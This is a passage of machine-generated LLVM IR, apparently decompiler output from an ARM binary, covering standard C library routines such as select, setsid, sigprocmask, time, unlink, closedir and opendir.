  %v3_10a64 = load i32, i32* @r7, align 4
  store i32 %v3_10a64, i32* %stack_var_-8, align 4
  %v0_10a70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10a70, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10a70, -4095
  br i1 %tmp, label %dec_label_pc_10a98, label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %entry
  %v0_10a84 = call i32 @__aeabi_read_tp()
  %v3_10a88 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10a88 = sext i16 %v3_10a88 to i32
  store i32 %v4_10a88, i32* @r3, align 4
  %v0_10a8c = load i32, i32* @r2, align 4
  %v1_10a8c = sub i32 0, %v0_10a8c
  store i32 %v1_10a8c, i32* @r2, align 4
  %v3_10a90 = add i32 %v4_10a88, %v0_10a84
  %v4_10a90 = inttoptr i32 %v3_10a90 to i32*
  store i32 %v1_10a8c, i32* %v4_10a90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10a98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10a98

dec_label_pc_10a98:                               ; preds = %entry, %dec_label_pc_10a80
  %v1_10a9c = phi i32 [ %v0_10a70, %entry ], [ -1, %dec_label_pc_10a80 ]
  %v2_10a98 = phi i32 [ %v3_10a64, %entry ], [ %v2_10a98.pre, %dec_label_pc_10a80 ]
  store i32 %v2_10a98, i32* @r7, align 4
  ret i32 %v1_10a9c

; uselistorder directives
  uselistorder i32 %v0_10a70, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a98, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10aa4 = load i32, i32* @r4, align 4
  store i32 %v3_10aa4, i32* %stack_var_-12, align 4
  %v0_10ab4 = load i32, i32* @r0, align 4
  store i32 %v0_10ab4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ab4, -4095
  br i1 %tmp, label %dec_label_pc_10adc, label %dec_label_pc_10ac4

dec_label_pc_10ac4:                               ; preds = %entry
  %v0_10ac8 = call i32 @__aeabi_read_tp()
  %v3_10acc = load i16, i16* @global_var_216f0.341, align 2
  %v4_10acc = sext i16 %v3_10acc to i32
  %v0_10ad0 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ad0 = sub i32 0, %v0_10ad0
  store i32 %v1_10ad0, i32* %r2.global-to-local, align 4
  %v3_10ad4 = add i32 %v4_10acc, %v0_10ac8
  %v4_10ad4 = inttoptr i32 %v3_10ad4 to i32*
  store i32 %v1_10ad0, i32* %v4_10ad4, align 4
  %v2_10adc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %entry, %dec_label_pc_10ac4
  %v1_10ae0 = phi i32 [ %v0_10ab4, %entry ], [ -1, %dec_label_pc_10ac4 ]
  %v2_10adc = phi i32 [ %v3_10aa4, %entry ], [ %v2_10adc.pre, %dec_label_pc_10ac4 ]
  store i32 %v2_10adc, i32* @r4, align 4
  ret i32 %v1_10ae0

; uselistorder directives
  uselistorder i32 %v0_10ab4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10adc, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10ae8 = load i32, i32* @r4, align 4
  store i32 %v3_10ae8, i32* %stack_var_-28, align 4
  %v6_10ae8 = load i32, i32* @r5, align 4
  %v9_10ae8 = load i32, i32* @r6, align 4
  %v12_10ae8 = load i32, i32* @r7, align 4
  %v15_10ae8 = load i32, i32* @r8, align 4
  %v18_10ae8 = load i32, i32* @sl, align 4
  %v21_10ae8 = load i32, i32* @lr, align 4
  %v4_10af8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_10b00 = icmp eq i32 %v4_10af8, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10b00, label %dec_label_pc_10b1c, label %entry.dec_label_pc_10b28_crit_edge

entry.dec_label_pc_10b28_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10b28

dec_label_pc_10b1c:                               ; preds = %entry
  store i32 %v3_10ae8, i32* @r4, align 4
  store i32 %v9_10ae8, i32* @r6, align 4
  store i32 %v12_10ae8, i32* @r7, align 4
  store i32 %v15_10ae8, i32* @r8, align 4
  store i32 %v18_10ae8, i32* %sl.global-to-local, align 4
  %v0_10b24 = call i32 @__syscall_select()
  br label %dec_label_pc_10b28

dec_label_pc_10b28:                               ; preds = %entry.dec_label_pc_10b28_crit_edge, %dec_label_pc_10b1c
  %v0_10b28 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10b28, i32* @r5, align 4
  %v0_10b3c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10b3c, i32* @r0, align 4
  %v0_10b44 = call i32 @__syscall_select()
  store i32 %v0_10b44, i32* @r4, align 4
  %v0_10b4c = load i32, i32* @r5, align 4
  %v1_10b50 = call i32 @__libc_disable_asynccancel(i32 %v0_10b4c)
  %v0_10b54 = load i32, i32* @r4, align 4
  %v2_10b5c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10b5c, i32* @r4, align 4
  store i32 %v6_10ae8, i32* @r5, align 4
  store i32 %v9_10ae8, i32* @r6, align 4
  store i32 %v12_10ae8, i32* @r7, align 4
  store i32 %v15_10ae8, i32* @r8, align 4
  store i32 %v18_10ae8, i32* @sl, align 4
  store i32 %v21_10ae8, i32* @lr, align 4
  ret i32 %v0_10b54

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10b28, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b6c = load i32, i32* @r7, align 4
  store i32 %v3_10b6c, i32* %stack_var_-8, align 4
  %v0_10b78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b78, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b78, -4095
  br i1 %tmp, label %dec_label_pc_10ba0, label %dec_label_pc_10b88

dec_label_pc_10b88:                               ; preds = %entry
  %v0_10b8c = call i32 @__aeabi_read_tp()
  %v3_10b90 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10b90 = sext i16 %v3_10b90 to i32
  %v0_10b94 = load i32, i32* %r2.global-to-local, align 4
  %v1_10b94 = sub i32 0, %v0_10b94
  store i32 %v1_10b94, i32* %r2.global-to-local, align 4
  %v3_10b98 = add i32 %v4_10b90, %v0_10b8c
  %v4_10b98 = inttoptr i32 %v3_10b98 to i32*
  store i32 %v1_10b94, i32* %v4_10b98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10ba0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %entry, %dec_label_pc_10b88
  %v1_10ba4 = phi i32 [ %v0_10b78, %entry ], [ -1, %dec_label_pc_10b88 ]
  %v2_10ba0 = phi i32 [ %v3_10b6c, %entry ], [ %v2_10ba0.pre, %dec_label_pc_10b88 ]
  store i32 %v2_10ba0, i32* @r7, align 4
  ret i32 %v1_10ba4

; uselistorder directives
  uselistorder i32 %v0_10b78, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ba0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_10bb0 = icmp eq i32* %arg2, null
  br i1 %v2_10bb0, label %dec_label_pc_10bf4, label %dec_label_pc_10bc4

dec_label_pc_10bc4:                               ; preds = %entry
  %v2_10bc4 = load i32, i32* %arg2, align 4
  %v1_10bc8 = icmp slt i32 %v2_10bc4, 0
  br i1 %v1_10bc8, label %dec_label_pc_10bdc, label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bc4
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_10bd0 = load i32, i32* %.pre3, align 4
  %v1_10bd4 = urem i32 %v3_10bd0, 2
  %v2_10bd4 = icmp eq i32 %v1_10bd4, 0
  br i1 %v2_10bd4, label %dec_label_pc_10bf4, label %dec_label_pc_10bdc

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10bc4, %dec_label_pc_10bd0
  %v2_10bdc = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_10bdc to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10bd0, %entry, %dec_label_pc_10bdc
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_10c28, label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10bf4
  %v1_10c14 = sub i32 0, %arg1
  %v3_10c18 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10c18 = sext i16 %v3_10c18 to i32
  %v0_10c1c = call i32 @__aeabi_read_tp()
  %v3_10c20 = add i32 %v4_10c18, %v0_10c1c
  %v4_10c20 = inttoptr i32 %v3_10c20 to i32*
  store i32 %v1_10c14, i32* %v4_10c20, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10bf4, %dec_label_pc_10c10
  %v1_10c30 = phi i32 [ %arg1, %dec_label_pc_10bf4 ], [ -1, %dec_label_pc_10c10 ]
  ret i32 %v1_10c30

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10c28, { 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10bdc, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10c3c = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10c4c = call i32 @gettimeofday(i32 %v2_10c3c, i32 0)
  %v2_10c50 = load i32, i32* %stack_var_-16, align 4
  %v2_10c54 = icmp eq i32* %arg1, null
  br i1 %v2_10c54, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_10c50, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_10c50

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c68 = load i32, i32* @r7, align 4
  store i32 %v3_10c68, i32* %stack_var_-8, align 4
  %v0_10c74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c74, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c74, -4095
  br i1 %tmp, label %dec_label_pc_10c9c, label %dec_label_pc_10c84

dec_label_pc_10c84:                               ; preds = %entry
  %v0_10c88 = call i32 @__aeabi_read_tp()
  %v3_10c8c = load i16, i16* @global_var_216f0.341, align 2
  %v4_10c8c = sext i16 %v3_10c8c to i32
  %v0_10c90 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c90 = sub i32 0, %v0_10c90
  store i32 %v1_10c90, i32* %r2.global-to-local, align 4
  %v3_10c94 = add i32 %v4_10c8c, %v0_10c88
  %v4_10c94 = inttoptr i32 %v3_10c94 to i32*
  store i32 %v1_10c90, i32* %v4_10c94, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c9c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %entry, %dec_label_pc_10c84
  %v1_10ca0 = phi i32 [ %v0_10c74, %entry ], [ -1, %dec_label_pc_10c84 ]
  %v2_10c9c = phi i32 [ %v3_10c68, %entry ], [ %v2_10c9c.pre, %dec_label_pc_10c84 ]
  store i32 %v2_10c9c, i32* @r7, align 4
  ret i32 %v1_10ca0

; uselistorder directives
  uselistorder i32 %v0_10c74, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c9c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10ca8 = load i32, i32* @r4, align 4
  store i32 %v3_10ca8, i32* %stack_var_-24, align 4
  %v9_10ca8 = load i32, i32* @r6, align 4
  %v12_10ca8 = load i32, i32* @r7, align 4
  %v15_10ca8 = load i32, i32* @r8, align 4
  %v18_10ca8 = load i32, i32* @lr, align 4
  %v2_10cac = load i32, i32* %arg1, align 4
  store i32 %v2_10cac, i32* %r3.global-to-local, align 4
  %v3_10cb4 = icmp eq i32 %v2_10cac, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r6, align 4
  br i1 %v3_10cb4, label %dec_label_pc_10cc8, label %dec_label_pc_10ce4

dec_label_pc_10cc8:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10a18.368 to i32), i32* %r2.global-to-local, align 4
  %v0_10ccc = call i32 @__aeabi_read_tp()
  %v3_10cd0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10cd0 = sext i16 %v3_10cd0 to i32
  store i32 %v4_10cd0, i32* %r2.global-to-local, align 4
  %v0_10cd4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10cd4, i32* %r1.global-to-local, align 4
  %v1_10cd8 = add i32 %v0_10cd4, 10
  store i32 %v1_10cd8, i32* %r3.global-to-local, align 4
  %v3_10cdc = add i32 %v4_10cd0, %v0_10ccc
  %v4_10cdc = inttoptr i32 %v3_10cdc to i32*
  store i32 %v1_10cd8, i32* %v4_10cdc, align 4
  %v0_10d8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d8c

dec_label_pc_10ce4:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_10ce8 = add i32 %tmp, 24
  store i32 %v1_10ce8, i32* %r2.global-to-local, align 4
  %v4_10cf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 68) to i32*), align 4
  store i32 %v4_10cf0, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10cfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10cfc)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10d14 = load i32, i32* @r6, align 4
  %v2_10d14 = add i32 %v0_10d14, 16
  %v3_10d14 = inttoptr i32 %v2_10d14 to i32*
  %v4_10d14 = load i32, i32* %v3_10d14, align 4
  call void @__pseudo_branch(i32 %v4_10d14)
  %v0_10d20 = load i32, i32* @r7, align 4
  %v1_10d20 = inttoptr i32 %v0_10d20 to i32*
  %v2_10d20 = load i32, i32* %v1_10d20, align 4
  store i32 %v2_10d20, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_10d30 = load i32, i32* @r8, align 4
  store i32 %v0_10d30, i32* %v1_10d20, align 4
  %v0_10d34 = load i32, i32* @r6, align 4
  %v1_10d34 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d34 = add i32 %v1_10d34, %v0_10d34
  %v3_10d34 = inttoptr i32 %v2_10d34 to i32*
  %v4_10d34 = load i32, i32* %v3_10d34, align 4
  store i32 ptrtoint (i32* @global_var_10d40.354 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10d34)
  %v0_10d40 = load i32, i32* @r7, align 4
  %v1_10d40 = add i32 %v0_10d40, 12
  %v2_10d40 = inttoptr i32 %v1_10d40 to i32*
  %v3_10d40 = load i32, i32* %v2_10d40, align 4
  store i32 %v3_10d40, i32* @r0, align 4
  %v0_10d44 = call i32 @free()
  %v0_10d48 = load i32, i32* @r7, align 4
  store i32 %v0_10d48, i32* @r0, align 4
  %v0_10d4c = call i32 @free()
  %v0_10d54 = load i32, i32* @r4, align 4
  store i32 %v0_10d54, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_10d54, -4095
  br i1 %tmp11, label %dec_label_pc_10d88, label %dec_label_pc_10d70

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10ce4
  store i32 67952, i32* %r3.global-to-local, align 4
  %v0_10d74 = call i32 @__aeabi_read_tp()
  %v3_10d78 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10d78 = sext i16 %v3_10d78 to i32
  store i32 %v4_10d78, i32* %r3.global-to-local, align 4
  %v0_10d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_10d7c = sub i32 0, %v0_10d7c
  store i32 %v1_10d7c, i32* %r2.global-to-local, align 4
  %v3_10d80 = add i32 %v4_10d78, %v0_10d74
  %v4_10d80 = inttoptr i32 %v3_10d80 to i32*
  store i32 %v1_10d7c, i32* %v4_10d80, align 4
  %v0_10d84 = load i32, i32* @r8, align 4
  br label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10ce4, %dec_label_pc_10d70
  %v0_10d88 = phi i32 [ %v0_10d54, %dec_label_pc_10ce4 ], [ %v0_10d84, %dec_label_pc_10d70 ]
  store i32 %v0_10d88, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d8c

dec_label_pc_10d8c:                               ; preds = %dec_label_pc_10cc8, %dec_label_pc_10d88
  %v0_10d8c = phi i32 [ %v0_10d8c.pre, %dec_label_pc_10cc8 ], [ %v0_10d88, %dec_label_pc_10d88 ]
  %v2_10d94 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10d94, i32* @r4, align 4
  store i32 %v9_10ca8, i32* @r6, align 4
  store i32 %v12_10ca8, i32* @r7, align 4
  store i32 %v15_10ca8, i32* @r8, align 4
  store i32 %v18_10ca8, i32* @lr, align 4
  ret i32 %v0_10d8c

; uselistorder directives
  uselistorder i32 %v0_10d54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10d88, { 1, 0 }
}

define i32 @function_10da4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10da4:
  %v0_10da4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10da4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10da4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10da4, %bb
  %v10_10db4 = phi i32 [ %arg1, %dec_label_pc_10da4 ], [ 0, %bb ]
  ret i32 %v10_10db4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10db8 = load i32, i32* @r4, align 4
  %v6_10db8 = load i32, i32* @r5, align 4
  %v9_10db8 = load i32, i32* @r6, align 4
  %v12_10db8 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_10dcc = call i32 @malloc()
  %v2_10dd4 = icmp eq i32 %v0_10dcc, 0
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r6, align 4
  br i1 %v2_10dd4, label %bb, label %dec_label_pc_10de4

bb:                                               ; preds = %entry
  br label %dec_label_pc_10e70

dec_label_pc_10de4:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10de8 = load i32, i32* @r4, align 4
  %v2_10de8 = icmp ugt i32 %v0_10de8, 511
  %v2_10dec = add i32 %v0_10dcc, 4
  %v3_10dec = inttoptr i32 %v2_10dec to i32*
  store i32 0, i32* %v3_10dec, align 4
  %v0_10df0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10df0 = add i32 %v0_10dcc, 16
  %v3_10df0 = inttoptr i32 %v2_10df0 to i32*
  store i32 %v0_10df0, i32* %v3_10df0, align 4
  %v0_10df4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10df4 = add i32 %v0_10dcc, 8
  %v3_10df4 = inttoptr i32 %v2_10df4 to i32*
  store i32 %v0_10df4, i32* %v3_10df4, align 4
  br i1 %v2_10de8, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10de4
  %v0_10dfc2 = load i32, i32* @r4, align 4
  %v2_10dfc3 = add i32 %v0_10dcc, 20
  %v3_10dfc4 = inttoptr i32 %v2_10dfc3 to i32*
  store i32 %v0_10dfc2, i32* %v3_10dfc4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10de4
  %v1_10df8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10df8 = add i32 %v1_10df8, 512
  store i32 %v2_10df8, i32* %r3.global-to-local, align 4
  %v0_10dfc = load i32, i32* @r4, align 4
  %v2_10dfc = add i32 %v0_10dcc, 20
  %v3_10dfc = inttoptr i32 %v2_10dfc to i32*
  store i32 %v0_10dfc, i32* %v3_10dfc, align 4
  %v1_10e00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_10e00, i32* %v3_10dfc, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_10dcc, i32* @r5, align 4
  %v0_10e08 = load i32, i32* @r7, align 4
  %v2_10e08 = inttoptr i32 %v0_10dcc to i32*
  store i32 %v0_10e08, i32* %v2_10e08, align 4
  %v0_10e0c = load i32, i32* @r5, align 4
  %v1_10e0c = add i32 %v0_10e0c, 20
  %v2_10e0c = inttoptr i32 %v1_10e0c to i32*
  %v3_10e0c = load i32, i32* %v2_10e0c, align 4
  store i32 %v3_10e0c, i32* %r1.global-to-local, align 4
  %v2_10e14 = call i32 @calloc(i32 1, i32 %v3_10e0c)
  %v2_10e18 = icmp eq i32 %v2_10e14, 0
  store i32 %v2_10e14, i32* @r4, align 4
  %v1_10e20 = load i32, i32* @r5, align 4
  %v2_10e20 = add i32 %v1_10e20, 12
  %v3_10e20 = inttoptr i32 %v2_10e20 to i32*
  store i32 %v2_10e14, i32* %v3_10e20, align 4
  br i1 %v2_10e18, label %dec_label_pc_10e28, label %dec_label_pc_10e38

dec_label_pc_10e28:                               ; preds = %bb17
  %v0_10e28 = load i32, i32* @r5, align 4
  store i32 %v0_10e28, i32* @r0, align 4
  %v0_10e2c = call i32 @free()
  %v0_10e30 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10e70

dec_label_pc_10e38:                               ; preds = %bb17
  %v0_10e3c = load i32, i32* @r6, align 4
  %v2_10e3c = add i32 %v0_10e3c, -34036
  store i32 %v2_10e3c, i32* %r3.global-to-local, align 4
  %v1_10e44 = inttoptr i32 %v2_10e3c to i32*
  %v2_10e44 = load i32, i32* %v1_10e44, align 4
  %v3_10e44 = add i32 %v0_10e3c, -34032
  %v4_10e44 = inttoptr i32 %v3_10e44 to i32*
  %v5_10e44 = load i32, i32* %v4_10e44, align 4
  store i32 %v5_10e44, i32* %r1.global-to-local, align 4
  %v6_10e44 = add i32 %v0_10e3c, -34028
  %v7_10e44 = inttoptr i32 %v6_10e44 to i32*
  %v8_10e44 = load i32, i32* %v7_10e44, align 4
  store i32 %v8_10e44, i32* %r2.global-to-local, align 4
  %v9_10e44 = add i32 %v0_10e3c, -34024
  %v10_10e44 = inttoptr i32 %v9_10e44 to i32*
  %v11_10e44 = load i32, i32* %v10_10e44, align 4
  store i32 %v11_10e44, i32* %r3.global-to-local, align 4
  %v12_10e44 = add i32 %v0_10e3c, -34020
  %v1_10e50 = inttoptr i32 %v12_10e44 to i32*
  %v2_10e50 = load i32, i32* %v1_10e50, align 4
  %v3_10e50 = add i32 %v0_10e3c, -34016
  %v4_10e50 = inttoptr i32 %v3_10e50 to i32*
  %v5_10e50 = load i32, i32* %v4_10e50, align 4
  store i32 %v2_10e50, i32* %stack_var_-32, align 4
  store i32 %v5_10e44, i32* %r1.global-to-local, align 4
  store i32 %v8_10e44, i32* %r2.global-to-local, align 4
  store i32 %v11_10e44, i32* %r3.global-to-local, align 4
  %v0_10e60 = load i32, i32* @r5, align 4
  %v1_10e60 = add i32 %v0_10e60, 24
  %v1_10e64 = inttoptr i32 %v1_10e60 to i32*
  store i32 %v2_10e44, i32* %v1_10e64, align 4
  %v3_10e64 = add i32 %v0_10e60, 28
  %v4_10e64 = inttoptr i32 %v3_10e64 to i32*
  %v5_10e64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10e64, i32* %v4_10e64, align 4
  %v6_10e64 = add i32 %v0_10e60, 32
  %v7_10e64 = inttoptr i32 %v6_10e64 to i32*
  %v8_10e64 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10e64, i32* %v7_10e64, align 4
  %v9_10e64 = add i32 %v0_10e60, 36
  %v10_10e64 = inttoptr i32 %v9_10e64 to i32*
  %v11_10e64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_10e64, i32* %v10_10e64, align 4
  %v12_10e64 = add i32 %v0_10e60, 40
  %v2_10e68 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_10e50, i32* %r1.global-to-local, align 4
  %v1_10e6c = inttoptr i32 %v12_10e64 to i32*
  store i32 %v2_10e68, i32* %v1_10e6c, align 4
  %v3_10e6c = add i32 %v0_10e60, 44
  %v4_10e6c = inttoptr i32 %v3_10e6c to i32*
  %v5_10e6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10e6c, i32* %v4_10e6c, align 4
  %v0_10e70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10e70

dec_label_pc_10e70:                               ; preds = %bb, %dec_label_pc_10e28, %dec_label_pc_10e38
  %v0_10e70 = phi i32 [ 0, %bb ], [ %v0_10e30, %dec_label_pc_10e28 ], [ %v0_10e70.pre, %dec_label_pc_10e38 ]
  store i32 %v3_10db8, i32* @r4, align 4
  store i32 %v6_10db8, i32* @r5, align 4
  store i32 %v9_10db8, i32* @r6, align 4
  store i32 %v12_10db8, i32* @r7, align 4
  ret i32 %v0_10e70

; uselistorder directives
  uselistorder i32 %v2_10e14, { 1, 0, 2 }
  uselistorder i32 %v0_10dcc, { 2, 1, 4, 0, 6, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 5, 8, 1, 9, 2, 10, 3, 11, 6, 12 }
  uselistorder label %dec_label_pc_10e70, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_10e88 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_10e90 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_10ec0, label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %entry
  %v0_10eac = call i32 @__aeabi_read_tp()
  %v3_10eb0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10eb0 = sext i16 %v3_10eb0 to i32
  %v0_10eb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10eb4 = sub i32 0, %v0_10eb4
  store i32 %v1_10eb4, i32* %r2.global-to-local, align 4
  %v3_10eb8 = add i32 %v4_10eb0, %v0_10eac
  %v4_10eb8 = inttoptr i32 %v3_10eb8 to i32*
  store i32 %v1_10eb4, i32* %v4_10eb8, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10ec0:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_10ec0 = icmp slt i32 %arg1, 0
  br i1 %v1_10ec0, label %dec_label_pc_10ee4, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10ec0
  store i32 %v2_10e90, i32* @r1, align 4
  %v0_10ecc = call i32 @fstat()
  %v1_10ed0 = icmp slt i32 %v0_10ecc, 0
  br i1 %v1_10ed0, label %dec_label_pc_10ed8, label %dec_label_pc_10eec

